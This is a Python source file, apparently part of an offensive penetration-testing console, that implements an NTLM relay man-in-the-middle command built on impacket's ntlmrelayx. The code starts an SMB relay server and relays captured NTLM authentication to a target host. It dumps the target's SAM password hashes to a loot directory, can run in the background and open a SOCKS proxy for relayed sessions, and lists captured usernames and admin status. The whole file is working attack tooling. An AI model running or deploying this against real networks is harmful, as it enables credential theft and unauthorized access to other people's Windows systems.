#!/usr/bin/env python3
from cmd2.command_definition import with_default_category
from cmd2 import CommandSet, with_default_category, Cmd2ArgumentParser, with_argparser
import argparse

import contextlib
from .servers import ConfigurationSmbRelayServer, Proxy
from impacket.examples.ntlmrelayx.clients.smbrelayclient import SMBRelayClient
from impacket.examples.ntlmrelayx.attacks.smbattack import SMBAttack
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from multiprocessing import Process, Manager
from threading import Thread
import sys
import os
import signal
import shutil
from requests import get, RequestException
from rich.console import Console
from rich.table import Table
from log_symbols import LogSymbols


@with_default_category("Man in the middle attacks")
class NtlmRelay(CommandSet):
    def __init__(self):
        super().__init__()
        self.__smb_relay_server = None
        self.__ntlm_relay_process = None

        self.__output_sam_dir = os.getcwd()

        # share between process
        self.__alerts_dictionary = Manager().dict()
        self.__define_alerts()
        self.__alerts_hunter = None

        self.__attacks = {"SMB": SMBAttack}
        self.__clients = {"SMB": SMBRelayClient}
        self.__config = None

    def __define_alerts(self) -> None:
        """Method to define the alert trigger dictionary."""
        self.__alerts_dictionary["sam_dump"] = 0
        self.__alerts_dictionary["new_connection"] = 0
        self.__alerts_dictionary["stop"] = 0

    def __configure_alert_thread(self) -> None:

        """Method to configure the thread that displays alerts."""
        self.__alerts_hunter = Thread(target=self.__display_alerts)
        self.__alerts_hunter.dameon = True
        self.__alerts_hunter.start()

    def __display_sam_alert(self) -> None:
        """Method that displays a message if the sam has been dumped."""
        if self.__alerts_dictionary["sam_dump"] == 1:
            if self._cmd.terminal_lock.acquire(blocking=False):
                self._cmd.async_alert(
                    f"{LogSymbols.INFO.value} The SAM of {self._cmd.RHOST} has been dumped"
                )
                self._cmd.info_logger.debug(
                    f"The SAM of {self._cmd.RHOST} has been dumped"
                )
                self._cmd.terminal_lock.release()

            self.__alerts_dictionary["sam_dump"] = 0

    def __display_connection_alert(self) -> None:
        """Method that displays a message if a new connection has been found."""
        if self.__alerts_dictionary["new_connection"] == 1:
            if self._cmd.terminal_lock.acquire(blocking=False):
                self._cmd.async_alert(
                    f"{LogSymbols.INFO.value} New connection captured! Use show_connections(-SC) to see it "
                )
                self._cmd.info_logger.debug(
                    f"{LogSymbols.INFO.value} New connection captured! Use show_connections(-SC) to see it "
                )
                self._cmd.terminal_lock.release()

            self.__alerts_dictionary["new_connection"] = 0

    def __display_alerts(self) -> None:
        """Method that will be checking if the attack is over to finish the
        thread that shows the alerts."""
        while self.__alerts_dictionary["stop"] != 1:
            self.__display_sam_alert()
            self.__display_connection_alert()

    def __checking_asynchronous_options(self, args: argparse.Namespace) -> None:
        """Method that will check the options of the asynchronous attack.

        Args:
            args (argparse.Namespace): Arguments passed to the attack.
        """

        if args.Asynchronous:
            sys.stdout = open("/dev/null", "w")
            signal.signal(signal.SIGINT, signal.SIG_IGN)

    def __checking_proxy_options(self, args: argparse.Namespace) -> None:
        """Method that will check the options of the proxy.

        Args:
            args (argparse.Namespace): Arguments passed to the attack.
        """

        if args.proxy:
            proxy_server = Proxy(self._cmd.info_logger)
            sock_server = proxy_server.server
            self.__config.setRunSocks(True, sock_server)

    def __checking_attack_options(self, args: argparse.Namespace) -> None:
        """Method that will check the options of the attack.

        Args:
            args (argparse.Namespace): Arguments passed to the attack.
        """
        if not self.__check_directory():
            self._cmd.error_logger.warning(
                "The specified directory does not exists or you don't have access"
            )
            return

        self.__checking_asynchronous_options(args)
        self.__checking_proxy_options(args)

    def __launch_attack(self, args: argparse.Namespace) -> None:
        """Method that will check the status of the attack
            and will launch an smb server that redirects connections.

        Args:
            args (argparse.Namespace): Arguments passed to the attack.
        """
        self.__checking_attack_options(args)
        self.__smb_relay_server.start_smb_relay_server()

    def __synchronous_attack(self) -> None:
        """Method to perform the attack synchronously."""
        try:
            self.__ntlm_relay_process.join()
        except KeyboardInterrupt:
            self.__ntlm_relay_process.terminate()
            self.__ntlm_relay_process.join()
            self.__ntlm_relay_process = None
            self._cmd.error_logger.warning("Exiting ntlm relay attack ...")
        finally:
            self._cmd.active_attacks_configure("NTLM_Relay", False)

    def __configure_ntlm_relay_attack(self, args: argparse.Namespace) -> None:
        """Method to configure the class NTLMRelayxConfig.
        Args:
            args (argparse.Namespace): Arguments passed to the attack.
        """
        target = TargetsProcessor(
            singleTarget=self._cmd.RHOST,
            protocolClients=self.__clients,
        )
        self.__config = NTLMRelayxConfig()
        if args.ipv6:
            self.__config.setIPv6(True)
            self.__config.setInterfaceIp("")
        else:
            self.__config.setInterfaceIp(self._cmd.LHOST)
        self.__config.setMode("RELAY")
        self.__config.setLootdir(args.output_sam)
        self.__config.setTargets(target)
        self.__config.setAttacks(self.__attacks)
        self.__config.setProtocolClients(self.__clients)
        self.__config.setSMB2Support(True)

    def __file_exits(self) -> bool:
        """Method to check if a file exists to check its overwriting."""
        exit = True
        if os.path.exists(f"{os.getcwd()}/{self.__output_sam_file}"):
            self._cmd.error_logger.warning(
                "The file will be overwrite, do you want to continue ?(press 'y' to continue but any)"
            )
            output = input()
            if output in ("y", "yes"):
                exit = False
        else:
            exit = False

        return exit

    def __check_directory(self) -> bool:
        """Method to check if a directory exists.

        Returns:
            bool: Directory status.
        """
        return os.path.isdir(self.__output_sam_dir) and os.access(
            self.__output_sam_dir, os.X_OK | os.W_OK
        )  

    def __checking_ending_options(self, args: argparse.Namespace) -> bool:
        """Method to set options when ending the attack.

        Args:
              args (argparse.Namespace): Arguments passed to the attack.

        """
        if args.end_attack:
            self.__ends_ntlm_relay()
            return False
        if self.__ntlm_relay_process is not None:
            self._cmd.error_logger.warning(
                "The attacks is already running in the background. Use -E to finish it."
            )
            return False
        return True

    def __checking_conditions_for_attack(
        self, args: argparse.Namespace, configurable_variables: dict
    ) -> bool:
        """Method to check different things before starting the attack.

        Args:
            args (argparse.Namespace): Arguments passed to the attack.
            configurable_variables(dict): Settable variables used in this command.

        """
        if args.show_connections:
            self.__show_connections()
            return False
        if not self.__checking_ending_options(args):
            return False

        self.__output_sam_file = f"{self._cmd.RHOST}_samhashes.sam"
        self.__output_sam_dir = args.output_sam

        if self.__file_exits():
            self._cmd.info_logger.info("Exiting ...")
            return False
        if not self._cmd.check_configurable_variables(configurable_variables):
            return False
        self.__configure_alert_thread()

        return True

    def __creating_components(self, args: argparse.Namespace) -> None:
        """Method to configure the classes to use.
        Args:
            args (argparse.Namespace): Arguments passed to the attack.

        """
        self.__configure_ntlm_relay_attack(args)

        self.__smb_relay_server = ConfigurationSmbRelayServer(
            self.__config,
            self._cmd.info_logger,
            args.Asynchronous,
            self.__alerts_dictionary,
        )

        self._cmd.active_attacks_configure("NTLM_Relay", True)

    def __wrapper_attack(self, args: argparse.Namespace) -> None:
        """Method to launch the attack
            Args:
                args (argparse.Namespace): Arguments passed to the attack.
        """
        self.__ntlm_relay_process = Process(target=self.__launch_attack, args=(args,))
        self.__ntlm_relay_process.start()
        if not args.Asynchronous:
            self.__synchronous_attack()
        else:
            self._cmd.info_logger.info(
                f"Running ntlm relay in the background the results will be saved at: {self.__output_sam_dir}/{self.__output_sam_file} "
            )

    def __show_connections(self) -> None:
        """Method to show the connections captured in the SOCKS server."""
        if self.__ntlm_relay_process is not None:
            url = f"http://{self._cmd.LHOST}:9090/ntlmrelayx/api/v1.0/relays"
            try:
                response = get(url)
                headers = ["Protocol", "Target", "Username", "Admin", "Port"]

                console = Console()
                table = Table(show_header=True, header_style="bold magenta")
                for header in headers:
                    table.add_column(header)
                for row in response.json():
                    table.add_row(
                        f"[blue]{row[0]}[/blue]",
                        f"[blue]{row[1]}[/blue]",
                        f"[blue]{row[2]}[/blue]",
                        f"[blue]{row[3]}[/blue]",
                        f"[blue]{row[4]}[/blue]",
                    )
                console.print(table)

            except RequestException:
                self._cmd.error_logger.error("Error while trying to connect")
        else:
            self._cmd.error_logger.error("The ntlm_relay process is not activated")

    def __ends_ntlm_relay(self) -> None:
        """Method to terminate the attack by the user."""
        if self.__ntlm_relay_process is not None and self.__ntlm_relay_process.is_alive:
            self._cmd.info_logger.success(
                "Finishing ntlm relay attack in the background ..."
            )
            self.__ntlm_relay_process.terminate()
            self.__ntlm_relay_process.join()
            self.__ntlm_relay_process = None
            self._cmd.active_attacks_configure("NTLM_Relay", False)
            if self.__alerts_hunter.is_alive():
                self._cmd.info_logger.debug("Finishing alerts thread ...")
                self.__alerts_dictionary["stop"] = 1
                self.__alerts_hunter.join()
                self.__alerts_dictionary["stop"] = 0

        else:
            self._cmd.error_logger.error(
                "There is not ntlm_relay process in the background"
            )

    def ntlm_relay_postloop(self) -> None:
        """Method to stop the attack before the application closes."""
        if self.__ntlm_relay_process is not None and self.__ntlm_relay_process.is_alive:
            self._cmd.info_logger.debug("Finishing ntlm_relay process ...")
            self.__ntlm_relay_process.terminate()
            self.__ntlm_relay_process.join()
        if self.__alerts_hunter is not None and self.__alerts_hunter.is_alive():
            self.__alerts_dictionary["stop"] = 1
            self._cmd.info_logger.debug("Finishing alerts thread ...")
            self.__alerts_hunter.join()

    argParser = Cmd2ArgumentParser(
        description="""Command to perform ntlm relay attack""",
        epilog="Next step\n-Use the scan command to identify potential users",
    )

    display_options = argParser.add_argument_group(
        " Arguments for displaying information "
    )
    display_options.add_argument(
        "-SS",
        "--show_settable",
        action="store_true",
        help="Show Settable variables for this command",
    )

    display_options.add_argument(
        "-SC",
        "--show_connections",
        action="store_true",
        help="Show current connections of the sock server",
    )

    run_options = argParser.add_argument_group(" Arguments for ways to run a program ")
    run_options.add_argument(
        "-A",
        "--Asynchronous",
        action="store_true",
        help="Perform the attack in the background",
    )

    attack_options = argParser.add_argument_group(" Options to modify attack behavior")
    attack_options.add_argument(
        "-P",
        "--proxy",
        action="store_true",
        help="Use a proxy server",
    )
    attack_options.add_argument(
        "-OS",
        "--output_sam",
        action="store",
        default="/home/igris/loot",
        help="Directory to save the SAM",
    )
    attack_options.add_argument(
        "-E",
        "--end_attack",
        action="store_true",
        help="End the attack in the background process",
    )
    attack_options.add_argument(
        "-IP6",
        "--ipv6",
        action="store_true",
        help="To attack with ipv6",
    )

    @with_argparser(argParser)
    def do_ntlm_relay(self, args: argparse.Namespace) -> None:
        """Command to perform ntlm relay attack.

        Args:
            args (argparse.Namespace): Arguments passed to the ntlm relay attack.
        """
        self._cmd.info_logger.debug(
            f"Starting ntlm relay attack using lhost: {self._cmd.LHOST} rhost:{self._cmd.RHOST} "
        )

        settable_variables_required = {
            "LHOST": self._cmd.LHOST,
            "RHOST": self._cmd.RHOST,
        }
        if args.show_settable:
            self._cmd.show_settable_variables_necessary(settable_variables_required)
        elif self._cmd.check_settable_variables_value(settable_variables_required):
            if not self.__checking_conditions_for_attack(
                args, settable_variables_required
            ):
                return

            self.__creating_components(args)
            self.__wrapper_attack(args)
